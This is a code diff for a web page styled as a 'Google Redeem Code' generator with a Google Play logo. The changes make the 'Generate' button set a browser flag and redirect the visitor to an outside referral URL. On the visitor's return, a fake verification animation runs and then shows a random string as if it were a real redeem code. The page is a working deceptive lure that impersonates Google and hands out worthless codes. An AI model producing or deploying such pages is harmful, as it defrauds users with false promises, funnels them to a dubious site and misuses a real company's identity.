@@ -2,13 +2,11 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <!-- Prevent mobile zoom on input focus -->
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>Google Redeem Code</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <style>
     * { margin:0; padding:0; box-sizing:border-box; }
-    html { -webkit-text-size-adjust: 100%; } /* Prevent font auto-resize in iOS */
-
+    html { -webkit-text-size-adjust:100%; }
     body {
       height:100vh;
       display:flex;
@@ -18,7 +16,7 @@
       font-family: Arial, sans-serif;
     }
     .container {
-      background:#fff;
+      background:white;
       padding:30px 20px;
       border-radius:12px;
       text-align:center;
@@ -43,8 +41,8 @@
       max-width:200px;
       margin:15px auto 0;
       padding:12px 0;
-      font-size:16px;       /* ≥16px to prevent zoom on focus */
-      color:#fff;
+      font-size:16px;
+      color:white;
       background:#00d44c;
       border:none;
       border-radius:8px;
@@ -65,7 +63,7 @@
     #redeemCode {
       width:100%;
       padding:12px;
-      font-size:16px;       /* ≥16px */
+      font-size:16px;
       text-align:center;
       border:2px solid #ccc;
       border-radius:6px;
@@ -79,7 +77,8 @@
     <div class="logo-wrapper">
       <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d0/Google_Play_Arrow_logo.svg/512px-Google_Play_Arrow_logo.svg.png" alt="Google Logo">
     </div>
-    <button id="startButton">Generate</button>
+
+    <button id="generateButton">Generate</button>
     <button id="verifyButton" style="display:none;">Verify</button>
 
     <div id="codeContainer">
@@ -90,36 +89,46 @@
   </div>
 
   <script>
-    const startButton   = document.getElementById("startButton");
-    const verifyButton  = document.getElementById("verifyButton");
-    const codeContainer = document.getElementById("codeContainer");
-    const redeemCode    = document.getElementById("redeemCode");
+    // Generate button redirect link
+    const GENERATE_URL = 'https://m.centefinance.life/?rel=uodkbnhi';
 
-    let hasVerified = false;
+    const generateBtn   = document.getElementById('generateButton');
+    const verifyBtn     = document.getElementById('verifyButton');
+    const codeContainer = document.getElementById('codeContainer');
+    const redeemCode    = document.getElementById('redeemCode');
 
-    startButton.addEventListener("click", () => {
-      startButton.style.display = "none";
-      verifyButton.style.display = "block";
+    // On page load, decide which button to show
+    window.addEventListener('DOMContentLoaded', () => {
+      if (localStorage.getItem('generated') === 'true') {
+        generateBtn.style.display = 'none';
+        verifyBtn.style.display   = 'block';
+      }
     });
 
-    verifyButton.addEventListener("click", () => {
+    // Generate: set flag and redirect
+    generateBtn.addEventListener('click', () => {
+      localStorage.setItem('generated','true');
+      window.location.href = GENERATE_URL;
+    });
+
+    // Verify logic
+    let hasVerified = false;
+    verifyBtn.addEventListener('click', () => {
       if (hasVerified) return;
       hasVerified = true;
 
-      verifyButton.innerText = "Verifying...";
-      verifyButton.disabled = true;
+      verifyBtn.innerText   = 'Verifying...';
+      verifyBtn.disabled    = true;
 
       setTimeout(() => {
-        verifyButton.innerText = "Verified ✅";
-        verifyButton.style.backgroundColor = "gray";
-        // keep disabled so it stays gray
-        verifyButton.disabled = true;
-
-        codeContainer.style.display = "flex";
-        redeemCode.value = generateCode();
+        verifyBtn.innerText            = 'Verified ✅';
+        verifyBtn.style.backgroundColor = 'gray';
+        codeContainer.style.display    = 'flex';
+        redeemCode.value               = generateCode();
       }, 2000);
     });
 
+    // Utility: generate random code
     function generateCode() {
       const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
       let code = '';
@@ -130,10 +139,11 @@
       return code;
     }
 
+    // Copy code to clipboard
     function copyCode() {
       redeemCode.select();
-      document.execCommand("copy");
-      alert("Copied: " + redeemCode.value);
+      document.execCommand('copy');
+      alert('Copied: ' + redeemCode.value);
     }
   </script>
 </body>
